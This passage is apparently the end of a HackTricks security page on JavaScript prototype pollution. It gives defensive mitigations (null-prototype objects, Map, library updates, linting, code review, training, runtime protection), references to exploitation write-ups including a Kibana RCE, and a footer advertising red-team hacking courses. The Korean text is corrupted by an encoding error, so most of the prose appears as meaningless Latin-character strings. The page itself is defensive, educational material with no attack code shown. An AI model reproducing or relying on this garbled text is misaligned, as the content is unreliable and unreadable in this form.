4. **í”„ë¡œí† íƒ€ì… ì—†ëŠ” ê°ì²´**: í”„ë¡œí† íƒ€ì… ì†ì„±ì´ ì—†ëŠ” ê°ì²´ëŠ” `Object.create(null)`ì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
5. **Map ì‚¬ìš©**: í‚¤-ê°’ ìŒì„ ì €ì¥í•  ë•Œ `Object` ëŒ€ì‹  `Map`ì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
6. **ë¼ì´ë¸ŒëŸ¬ë¦¬ ì—…ë°ì´íŠ¸**: ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì •ê¸°ì ìœ¼ë¡œ ì—…ë°ì´íŠ¸í•˜ì—¬ ë³´ì•ˆ íŒ¨ì¹˜ë¥¼ í†µí•©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
7. **ë¦°í„° ë° ì •ì  ë¶„ì„ ë„êµ¬**: í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ ê°ì§€í•˜ê³  ë°©ì§€í•˜ê¸° ìœ„í•´ ì ì ˆí•œ í”ŒëŸ¬ê·¸ì¸ì´ í¬í•¨ëœ ESLintì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.
8. **ì½”ë“œ ë¦¬ë·°**: í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ê³¼ ê´€ë ¨ëœ ì ì¬ì  ìœ„í—˜ì„ ì‹ë³„í•˜ê³  ìˆ˜ì •í•˜ê¸° ìœ„í•´ ì² ì €í•œ ì½”ë“œ ë¦¬ë·°ë¥¼ ì‹œí–‰í•˜ì„¸ìš”.
9. **ë³´ì•ˆ êµìœ¡**: ê°œë°œìì—ê²Œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì˜ ìœ„í—˜ê³¼ ì•ˆì „í•œ ì½”ë“œë¥¼ ì‘ì„±í•˜ê¸° ìœ„í•œ ëª¨ë²” ì‚¬ë¡€ì— ëŒ€í•´ êµìœ¡í•˜ì„¸ìš”.
10. **ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš© ì‹œ ì£¼ì˜**: ì„œë“œíŒŒí‹° ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•  ë•Œ ì£¼ì˜í•˜ì„¸ìš”. ê·¸ë“¤ì˜ ë³´ì•ˆ ìƒíƒœë¥¼ í‰ê°€í•˜ê³ , íŠ¹íˆ ê°ì²´ë¥¼ ì¡°ì‘í•˜ëŠ” ì½”ë“œì— ëŒ€í•´ ê²€í† í•˜ì„¸ìš”.
11. **ëŸ°íƒ€ì„ ë³´í˜¸**: í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ê³µê²©ì„ ê°ì§€í•˜ê³  ë°©ì§€í•  ìˆ˜ ìˆëŠ” ë³´ì•ˆ ì¤‘ì‹¬ì˜ npm íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ëŠ” ë“± ëŸ°íƒ€ì„ ë³´í˜¸ ë©”ì»¤ë‹ˆì¦˜ì„ ì‚¬ìš©í•˜ì„¸ìš”.

## ì°¸ê³  ë¬¸í—Œ

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
